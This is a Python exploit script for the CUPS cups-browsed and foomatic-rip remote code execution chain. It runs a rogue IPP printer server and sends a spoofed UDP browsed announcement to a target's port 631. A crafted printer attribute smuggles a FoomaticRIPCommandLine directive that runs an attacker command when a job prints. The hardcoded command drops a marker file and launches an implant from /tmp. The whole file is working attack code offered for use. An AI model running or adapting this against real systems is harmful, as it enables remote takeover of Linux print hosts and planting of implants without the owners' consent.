#!/usr/bin/env python3
import os
import socket
import sys
import threading
import time

import ippserver.behaviour as behaviour
from ippserver.constants import OperationEnum, SectionEnum, StatusCodeEnum, TagEnum
from ippserver.parsers import Boolean, Enum, Integer
from ippserver.request import IppRequest
from ippserver.server import IPPRequestHandler, IPPServer


class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def minimal_attributes(self):
        return {
            (SectionEnum.operation, b"attributes-charset", TagEnum.charset): [b"utf-8"],
            (
                SectionEnum.operation,
                b"attributes-natural-language",
                TagEnum.natural_language,
            ): [b"en"],
        }

    def printer_list_attributes(self):
        attr = {
            (SectionEnum.printer, b"printer-uri-supported", TagEnum.uri): [
                self.printer_uri
            ],
            (SectionEnum.printer, b"uri-authentication-supported", TagEnum.keyword): [
                b"none"
            ],
            (SectionEnum.printer, b"uri-security-supported", TagEnum.keyword): [
                b"none"
            ],
            (SectionEnum.printer, b"printer-name", TagEnum.name_without_language): [
                b"Main Printer"
            ],
            (SectionEnum.printer, b"printer-info", TagEnum.text_without_language): [
                b"Main Printer Info"
            ],
            (
                SectionEnum.printer,
                b"printer-make-and-model",
                TagEnum.text_without_language,
            ): [b"HP 0.00"],
            (SectionEnum.printer, b"printer-state", TagEnum.enum): [
                Enum(3).bytes()
            ],  # idle
            (SectionEnum.printer, b"printer-state-reasons", TagEnum.keyword): [b"none"],
            (SectionEnum.printer, b"ipp-versions-supported", TagEnum.keyword): [b"1.1"],
            (SectionEnum.printer, b"operations-supported", TagEnum.enum): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,
                    OperationEnum.validate_job,
                    OperationEnum.cancel_job,
                    OperationEnum.get_job_attributes,
                    OperationEnum.get_printer_attributes,
                )
            ],
            (
                SectionEnum.printer,
                b"multiple-document-jobs-supported",
                TagEnum.boolean,
            ): [Boolean(False).bytes()],
            (SectionEnum.printer, b"charset-configured", TagEnum.charset): [b"utf-8"],
            (SectionEnum.printer, b"charset-supported", TagEnum.charset): [b"utf-8"],
            (
                SectionEnum.printer,
                b"natural-language-configured",
                TagEnum.natural_language,
            ): [b"en"],
            (
                SectionEnum.printer,
                b"generated-natural-language-supported",
                TagEnum.natural_language,
            ): [b"en"],
            (
                SectionEnum.printer,
                b"document-format-default",
                TagEnum.mime_media_type,
            ): [b"application/pdf"],
            (
                SectionEnum.printer,
                b"document-format-supported",
                TagEnum.mime_media_type,
            ): [b"application/pdf"],
            (SectionEnum.printer, b"printer-is-accepting-jobs", TagEnum.boolean): [
                Boolean(True).bytes()
            ],
            (SectionEnum.printer, b"queued-job-count", TagEnum.integer): [
                Integer(666).bytes()
            ],
            (SectionEnum.printer, b"pdl-override-supported", TagEnum.keyword): [
                b"not-attempted"
            ],
            (SectionEnum.printer, b"printer-up-time", TagEnum.integer): [
                Integer(self.printer_uptime()).bytes()
            ],
            (SectionEnum.printer, b"compression-supported", TagEnum.keyword): [b"none"],
            (SectionEnum.printer, b"printer-privacy-policy-uri", TagEnum.uri): [
                b'https//www.google.com/%22%5Cn*FoomaticRIPCommandLine: "'
                + self.command.encode()
                + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'
            ],
        }
        attr.update(self.minimal_attributes())
        return attr

    def operation_printer_list_response(self, req, _psfile):
        print("target connected, sending payload ...")
        attributes = self.printer_list_attributes()
        return IppRequest(self.version, StatusCodeEnum.ok, req.request_id, attributes)

    def operation_print_job_response(self, req, psfile):
        """
        Handle a print-job request:
         1) Execute the payload command (drop/run implant)
         2) Return a minimal IPP OK response
        """
        print("[*] Received print job; executing payload command â€¦")
        os.system(self.command)

        return IppRequest(
            self.version, StatusCodeEnum.ok, req.request_id, self.minimal_attributes()
        )


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    print("sending udp packet to %s:%d ..." % (ip, port))

    printer_type = 0x00
    printer_state = 0x03
    printer_uri = "http://%s:%d/printers/NAME" % (ipp_server_host, ipp_server_port)
    printer_location = "Office HQ"
    printer_info = "Printer"

    message = bytes(
        '%x %x %s "%s" "%s"'
        % (printer_type, printer_state, printer_uri, printer_location, printer_info),
        "UTF-8",
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (ip, port))


def wait_until_ctrl_c():
    try:
        while True:
            time.sleep(300)
    except KeyboardInterrupt:
        return


def run_server(server):
    print("malicious ipp server listening on ", server.server_address)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    wait_until_ctrl_c()
    server.shutdown()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("%s <LOCAL_HOST> <TARGET_HOST>" % sys.argv[0])
        quit()

    SERVER_HOST = sys.argv[1]
    SERVER_PORT = 12345

    command = "echo 'I AM VULNERABLE' > /tmp/I_AM_VULNERABLE; nohup python3 /tmp/implant_CUPS.py &"

    server = IPPServer(
        (SERVER_HOST, SERVER_PORT), IPPRequestHandler, MaliciousPrinter(command)
    )

    threading.Thread(target=run_server, args=(server,)).start()

    TARGET_HOST = sys.argv[2]
    TARGET_PORT = 631
    send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)

    print("waiting ...")

    while True:
        time.sleep(1.0)
